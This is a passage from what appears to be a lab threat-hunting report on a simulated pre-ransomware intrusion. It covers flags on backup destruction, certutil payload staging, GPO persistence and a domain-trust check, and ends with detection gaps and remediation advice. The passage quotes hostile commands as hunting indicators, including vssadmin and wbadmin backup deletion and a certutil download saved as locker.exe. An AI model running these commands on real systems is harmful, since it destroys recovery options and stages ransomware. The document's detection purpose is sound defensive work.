Before staging the ransomware payload on GF-BKP01, the attacker ran a cluster of commands with the singular objective of disabling backups — destroying the organization's recovery capability before encrypting data. This is standard pre-ransomware tradecraft: ensure victims cannot restore from backup, making the ransom demand the only path to recovery.

### 💡 Why it matters
Backup destruction before ransomware deployment is the hallmark of a double-extortion operator. Without backups, even organizations with strong security posture face significant recovery costs. The backup server was specifically targeted because its compromise eliminates the primary recovery option.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on `wbadmin delete catalog`, `vssadmin delete shadows`, `bcdedit /set recoveryenabled No`, or `net stop` targeting backup service names. Any command cluster on a backup server that touches VSS or backup catalog management outside of scheduled maintenance is high priority.

</details>

---

<details>
<summary id="-flag-18--ransomware-staging-via-masquerading">🚩 <strong>Flag 18 – Ransomware Staging via Masquerading</strong></summary>

### 🎯 Objective
Identify the technique used to download the ransomware payload and where it was staged.

### 📌 Finding
At 01:09 UTC on 2026-06-12, d.williams (via wmiexec on GF-BKP01) ran:
`certutil -urlcache -split -f https://download.sysinternals.com/files/PsExec.zip C:\Windows\Temp\locker.exe`

The download URL points to the legitimate Microsoft Sysinternals PsExec.zip — bypassing URL reputation and proxy filters — but the file was saved as `locker.exe`, the actual ransomware payload. This is Masquerading (T1036): the download source is trusted, but the saved filename reveals the true purpose.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Download URL | https://download.sysinternals.com/files/PsExec.zip |
| Saved As | C:\Windows\Temp\locker.exe |
| Tool | certutil (Living off the Land) |
| Actor | d.williams |
| Host | GF-BKP01.greenfield.local |
| Timestamp | 01:09:09 UTC (2026-06-12) |

### 💡 Why it matters
Using a trusted Sysinternals URL to bypass web proxy filtering is a common LOTL technique. The mismatch between the source filename (`PsExec.zip`) and the saved filename (`locker.exe`) is the masquerading indicator. certutil's `-urlcache` flag is also a well-known LOTL download vector.

### 🛠️ Detection Recommendation
**Hunting Tip:** Alert on `certutil` with `-urlcache` or `-split -f` flags. Also alert on files saved to `C:\Windows\Temp\` with `.exe` extensions by non-SYSTEM accounts via wmiexec or similar tools.

</details>

---

<details>
<summary id="-flag-19--persistence-model-group-policy">🚩 <strong>Flag 19 – Persistence Model: Group Policy</strong></summary>

### 🎯 Objective
Explain how the attacker maintained domain-wide control without creating new accounts or modifying group memberships.

### 📌 Finding
No new user accounts (EventID 4720) or group membership changes (EventID 4732) were observed during the entire intrusion window. Instead, the attacker maintained domain-wide control through two existing components: (1) the Group Policy Object linked at the domain root — which executes their payload on every machine at every policy refresh — and (2) stolen credentials for existing accounts (d.williams, svc_backup) that they never had to create. This is Defense Evasion against Persistence: the persistence is invisible to account-creation audits because no new accounts exist.

### 💡 Why it matters
Most incident responders check for new accounts and group changes as the first persistence indicator. Finding none is a false negative if you don't also check for GPO modifications and stolen credential reuse.

### 🛠️ Detection Recommendation
**Hunting Tip:** Persistence hunting must include: (1) new accounts/group changes, (2) GPO modifications, (3) scheduled task creation across the estate, (4) new services, AND (5) authentication anomalies from existing accounts. The absence of #1 does not rule out #2-5.

</details>

---

<details>
<summary id="-flag-20--trust-boundary-check">🚩 <strong>Flag 20 – Trust Boundary Check</strong></summary>

### 🎯 Objective
Determine whether the attacker crossed into the `corp.lognpacific.local` domain via the existing trust.

### 📌 Finding
GF-DC02 (`corp.lognpacific.local`) was checked for attacker footprints — NTLM logons from known attacker accounts, ADMIN$ timestamp files (wmiexec signature), scheduled task creation, and recon commands. Only legitimate Azure VM agent activity (`CollectGuestLogs.exe` as `GF-DC02$`) was observed. No attacker activity was detected on GF-DC02 within the hunt window. **Verdict: did not cross the trust.**

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host Checked | GF-DC02.corp.lognpacific.local |
| Activity Found | CollectGuestLogs.exe (Azure agent — legitimate) |
| Attacker Footprints | None detected |
| Verdict | Trust not crossed in this window |

### 🔧 KQL Query Used

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-06-11T21:54:00Z) .. datetime(2026-06-12T06:00:00Z))
| where Computer contains "GF-DC02"
| where EventID in (4624, 4662, 4698, 4720, 4732)
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, EventID, SubjectUserName, TargetUserName, IpAddress
```

### 💡 Why it matters
With krbtgt compromised, a SID history or inter-realm forged ticket attack against the trust is trivially possible. The absence of activity in this window doesn't mean it won't happen — with Golden Ticket capability, the attacker can cross the trust at any future time until krbtgt is double-rotated in both domains.

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps

1. **Registry reads produce no audit events by default** — The automated host enumeration (mass reg queries across user SIDs) left no Security Event Log records because Windows does not SACL registry keys by default. Sentinel saw nothing; only MDE's behavioral sensor caught it.

2. **DCSync leaves no LSASS trace** — The most damaging credential theft in this incident generated no memory access events. The only log artifact (EventID 4662) requires Directory Service Access auditing to be explicitly enabled on DCs — which it was not.

3. **NTLM DA logons not baselined** — A Domain Admin authenticating to a DC via NTLM (Pass-the-Hash indicator) is anomalous, but no alert existed for this pattern.

4. **GPO modification not monitored** — EventID 5136 (DS Object Modified) for GPO objects was not configured as an alert, allowing the attacker to link a domain-wide malicious policy without triggering any detection.

5. **Cloudflare tunnel exfiltration blended with legitimate traffic** — `trycloudflare.com` is a trusted domain; large HTTPS POST operations to it were not alerted on.

### Recommendations

1. **Enable Directory Service Access auditing on all DCs** and alert on EventID 4662 with replication GUIDs from non-machine accounts.
2. **Alert on EventID 4769 with TicketEncryptionType 0x17 (RC4)** — enforce AES-only via `msDS-SupportedEncryptionTypes`.
3. **Alert on NTLM authentication from DA accounts** to Domain Controllers — Kerberos is the expected protocol.
4. **Monitor EventID 5136 for GPO object creation/modification** outside of change management windows.
5. **Use Group Managed Service Accounts (gMSA)** for all service accounts to eliminate Kerberoastable SPN targets.
6. **Implement an RMM tool allowlist** and alert on unapproved remote access software installations.
7. **Deploy MDE + Sentinel connector** — behavioral EDR and SIEM are complementary, not redundant.

---

## 🧾 Final Assessment

This was a sophisticated, pre-meditated intrusion consistent with a ransomware-as-a-service operator conducting pre-ransom staging. The attacker demonstrated fluency with Active Directory privilege escalation (Kerberoasting → DCSync chain), living-off-the-land execution (certutil, wmiexec, Compress-Archive), and operational security awareness (Cloudflare tunnel fronting, task name reuse, no new accounts created). Total time from VPN entry to domain-wide ransomware staging was approximately 7 hours. All domain credentials must be considered compromised. Full remediation requires: (1) krbtgt double rotation, (2) all service and privileged account password resets, (3) GPO removal, (4) AnyDesk uninstall, (5) GreenfieldUpdate scheduled task removal across all hosts, and (6) review and removal of the `Replicating Directory Changes All` ACE from svc_backup.

---

## 📎 Analyst Notes

- Report structured for portfolio and interview review — all findings are evidence-backed via Sentinel/WindowsProcess_CL/SecurityEvent queries
- Defender XDR Incident 88471 (Pre-Ransom classification) served as initial triage context
- All timestamps are UTC; Defender PDF displayed UTC-5 (local display only)
- MITRE ATT&CK mappings reference ATT&CK Enterprise v15
- Hunt conducted on: hunt.lognpacific.com | Workspace: LAW-SilentCorridor
